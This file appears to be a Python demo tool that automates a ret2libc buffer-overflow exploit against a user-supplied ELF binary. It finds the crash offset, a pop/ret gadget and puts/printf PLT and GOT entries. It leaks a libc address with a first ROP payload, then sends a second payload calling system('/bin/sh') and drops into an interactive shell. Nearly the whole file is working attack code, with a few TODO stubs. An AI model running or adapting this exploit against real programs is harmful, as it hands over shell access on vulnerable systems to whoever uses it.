#! /usr/bin/python3
import os
from os import path
import click
from find_segfault import find_segfault
from bin_handler import Bin_handler
from bin_handler import search_string
from payload_handler import Evil_payload_handler
from payload_handler import Fifo_handler
from payload_handler import has_null_bytes
from gadget_finder import Gadget_finder
from process_handler import Process_handler


def hex_to_int(hex_str=''):
    if len(hex_str) == 0:
        return 0
    return int(hex_str, 16)


def click_confirm(message=""):
    click.confirm("\n[DEMO] " + message, default="y")
    print("")


def cleanup(payload_name):
    try:
        if len(payload_name) > 0:
            os.unlink(payload_name)
    except OSError:
        print("Unable to delete payload file", payload_name)


def validate_program():
    program_name = ""
    program_name = click.prompt('Please enter a program name', type=str)
    print("")
    # print("Program name is", program_name)

    if path.exists(program_name) is False:
        print("Program does not exists, exiting...")
        exit()

    return program_name


def validate_probe_mode(probe_mode=4):
    valid_responses = [1, 2, 3, 4]

    if probe_mode in valid_responses:
        return probe_mode

    probe_mode = 0
    print("")
    print("Please select method of probing for buffer overflow:")
    print("1 - probe with payload as argument")
    print("2 - probe with payload as filename")
    print("3 - probe with payload as argument and filename")
    print("4 - automate probing (default)")
    valid_probing_mode = False
    while valid_probing_mode is False:
        probe_mode = click.prompt('Method:', type=int, default=4)
        print("")
        if probe_mode in valid_responses:
            valid_probing_mode = True
        else:
            print('Invalid method, try again')
    return probe_mode


def validate_max_payload_size():
    max_payload_size = 0
    valid_payload_size = False
    while valid_payload_size is False:
        max_payload_size = click.prompt('Please enter maximum payload size',
                                        type=int,
                                        default=600)
        print("")
        if max_payload_size > 0:
            valid_payload_size = True

    print("Payload size is", max_payload_size)
    return max_payload_size


# main start of the script
program_name = validate_program()

bh = Bin_handler(program_name)
is_elf = bh.check_architect()

if is_elf is False:
    print("Program is not an executable file (ELF), exiting...")
    exit()

# determine architect type of binary
bin_arch = bh.arch

# print("The architect is:", bin_arch, "bit")
# print("")

probe_mode = validate_probe_mode(4)

# NOTE: we are not able to automate max payload size value calculation
max_payload_size = validate_max_payload_size()

# if mode 1 and 3 are selected DO NOTHING

# get filename if 2 and 3 are selected
payload_name = ''
if probe_mode == 2 or probe_mode == 3:
    print("")
    payload_name = click.prompt('Please enter name of payload file',
                                type=str)

click_confirm('Press any key to check for segfault')

seg_fault_results = find_segfault(program_name,
                                  bin_arch,
                                  probe_mode,
                                  max_payload_size,
                                  payload_name)

has_segfault, segfault_address, segfault_offset, \
    found_payload_file, found_str_address = seg_fault_results

if len(found_payload_file) > 0:
    payload_name = found_payload_file

if has_segfault:
    print("Segfault found at", segfault_address)
    print("Segfault offset is", segfault_offset)
else:
    print("No segfault found")
    exit()

click_confirm("Press any key to continue check for libc")

print("")
print("Checking if libc is used")
print("---------------------------------------------")

# check for libc
if bh.has_libc() is True:
    print("Found libc at", bh.libc_path)
else:
    print("Libc not found")
    exit()

click_confirm('Press any key to continue check static addresses')

print("")
print("Searching for static addresses")
print("---------------------------------------------")

# To check for plt sections, we want printf or puts
# that will be used for leaking the libc address

# For GOT address, we are interested in .got.plt section
# of "readelf -S binary_file"
found_printf, printf_plt, printf_got = bh.search_plt_got(program_name,
                                                         'printf',
                                                         bin_arch)
# TODO: temporarily not using printf
found_printf = False

found_puts, puts_plt, puts_got = bh.search_plt_got(program_name,
                                                   'puts',
                                                   bin_arch)

if found_printf:
    print("Found address of printf@plt", printf_plt)
    print("Found address of printf@got", printf_got)

if found_puts:
    print("Found address of puts@plt", puts_plt)
    print("Found address of puts@got", puts_got)

# check for address of important functions
system_found, system_offset = bh.search_function(bh.libc_path, 'system')
printf_found, printf_offset = bh.search_function(bh.libc_path, 'printf')
puts_found, puts_offset = bh.search_function(bh.libc_path, 'puts')
exit_found, exit_offset = bh.search_function(bh.libc_path, 'exit')
sstart_found, sstart_address = bh.search_asm_function(program_name, '_start')

print("Found address of _start", sstart_address)

if bin_arch == 32 and has_null_bytes(sstart_address):
    # print("WARNING, address contains NULL bytes, adjusting...")
    sstart_address_int = hex_to_int(sstart_address)
    sstart_address_int = sstart_address_int + 4
    sstart_address = hex(sstart_address_int)[2:]
    # print("Found address of _start[UPDATED]", sstart_address)

click_confirm('Press any key to continue to check address offsets')

print("")
print("Searching for address offsets")
print("---------------------------------------------")

print("Offset of system", system_offset)
# print("Offset of printf", printf_offset)
print("Offset of puts", puts_offset)
print("offset of exit", exit_offset)

# click_confirm('Press any key to continue find /bin/sh address offset')

# print("")
# print("Searching for /bin/sh address offset")
# print("---------------------------------------------")

# find bin/sh string address from libc's rodata
b_sec_results = bh.search_section(bh.libc_path, '.rodata')
found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
rodata_address_int = hex_to_int(rodata_address)
rodata_start_int = hex_to_int(rodata_start)
rodata_end_int = rodata_start_int + hex_to_int(rodata_end)

binsh_offset_int = search_string(bh.libc_path,
                                 "/bin/sh",
                                 rodata_start_int,
                                 rodata_end_int)

binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)

print("Offset of /bin/sh", binsh_offset_hex)

click_confirm('Press any key to continue searching for gadget')

print("")
print("Searching for gadget address (pop [register]; ret;)")
print("---------------------------------------------")

# find any gadget pop register; ret;
ax_sections = bh.get_ax_sections(program_name)
gfinder = Gadget_finder(program_name, bin_arch)
found_gadget = False
gadget_address = ''
popregret_address = ''
for xsection in ax_sections:
    # print("Checking executable section", xsection)

    ax_add_int = hex_to_int(ax_sections[xsection][0])
    ax_start_int = hex_to_int(ax_sections[xsection][1])
    ax_end_int = ax_start_int + hex_to_int(ax_sections[xsection][2])
    gadget_regex = None
    if bin_arch == 32:
        gadget_regex = r"0x([a-f0-9]+):\spop\se\w?x;\s?" + \
                       r"(0x[a-f0-9]+):\s?ret\s?;"
    else:
        gadget_regex = r"0x([a-f0-9]+):\spop\sr(\w?x|di|\d+);\s?" + \
                       r"(0x[a-f0-9]+):\s?retq?\s?;"
    found_gadget, gadget_address = gfinder.find(gadget_regex,
                                                ax_start_int,
                                                ax_end_int)
    if found_gadget:
        popregret_address = ax_add_int + hex_to_int(gadget_address)
        print("Found gadget in",
              xsection,
              "section with address",
              hex(popregret_address))
        break

if found_gadget is False:
    print("Unable to find gadget, exiting...")
    cleanup(payload_name)
    exit()

first_evil = Evil_payload_handler(max_payload_size, segfault_offset, bin_arch)
if found_printf:
    first_evil.add_content(hex_to_int(printf_plt))
else:
    first_evil.add_content(hex_to_int(puts_plt))

# random address for testing purpose
if found_str_address > 0:

    # make payload first print random string, then print got address
    # gadget to pop
    first_evil.add_content(popregret_address)
    first_evil.add_content(found_str_address)

    if found_printf:
        first_evil.add_content(hex_to_int(printf_plt))
    else:
        first_evil.add_content(hex_to_int(puts_plt))

    first_evil.add_content(popregret_address)
    if found_printf:
        first_evil.add_content(hex_to_int(printf_got))
    else:
        first_evil.add_content(hex_to_int(puts_got))

    # put address to start of the program
    first_evil.add_content(hex_to_int(sstart_address))
    first_evil.add_content(found_str_address)
    first_evil.add_content(found_str_address)
    first_evil.add_content(found_str_address)

else:
    # TODO: need to find a string that has a valid address
    print("this part of logic is incomplete")

# use fifo pipe instead
# first_evil.write_to_plaintext("debug_" + program_name + "_payload_1")

phandle = Fifo_handler(payload_name)
phandle.unlink()
phandle.create_new()

click_confirm('Press any key to begin exploit')

print("")
print("Starting exploit")
print("---------------------------------------------")

proc = Process_handler(program_name)
# use payload_name as argument
proc.process(payload_name)

phandle.open()
phandle.write(first_evil.get_payload())
print("First payload is written")
print("")

tempstr = payload_name + "\n"
# print("Reading until following bytes:", tempstr.encode('utf-8'))
recv_str = proc.recvuntil(delims=tempstr.encode('utf-8'), timeout=10)
print("Output received before the leak: {}".format(recv_str))

if len(recv_str) == 0:
    print("Exploit failed")
    cleanup(payload_name)
    exit()

recvdata = proc.recvline()

if found_printf:
    print("Full leak:", recvdata)
    # print("len of string used", len(payload_name))
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end]
else:
    print("Full leak:", recvdata)
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end]
    recvdata = recvdata[:4]

leaked_bytes = bytearray.fromhex(recvdata.hex())
leaked_bytes_int = int.from_bytes(leaked_bytes, byteorder='little')
if found_printf:
    print("")
    print("Leaked address of printf:",
          hex(int.from_bytes(leaked_bytes, byteorder='little')))
else:
    print("")
    print("Leaked address of puts:",
          hex(leaked_bytes_int))

if len(leaked_bytes) == 0:
    print("Exploit failed, no address leaked")
    cleanup(payload_name)
    exit()

click_confirm('Press any key to calculate libc address')

# calculate all addresses
libc_base_address = 0
if found_printf:
    libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
                        hex_to_int(printf_offset)
else:
    libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
                        hex_to_int(puts_offset)

print("Calculation of libc address = leaked address of puts - offset of puts")
print("Calculation of libc address =",
      hex(leaked_bytes_int)[2:],
      "-",
      puts_offset)

print("Calculated libc address:", hex(libc_base_address))

system_address = libc_base_address + hex_to_int(system_offset)
binsh_address = libc_base_address + hex_to_int(binsh_offset_hex)
exit_address = libc_base_address + hex_to_int(exit_offset)

print("system address:", hex(system_address))
print("/bin/sh address:", hex(binsh_address))
print("exit address:", hex(exit_address))

second_evil = Evil_payload_handler(max_payload_size, segfault_offset)
second_evil.add_content(system_address)
second_evil.add_content(exit_address)
second_evil.add_content(binsh_address)

print("")
print("Second payload is written")

phandle.write(second_evil.get_payload())
# second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")

# ready to get interactive after sending
click_confirm('Press any key to get interactive shell')

proc.interactive()
phandle.close()

cleanup(payload_name)
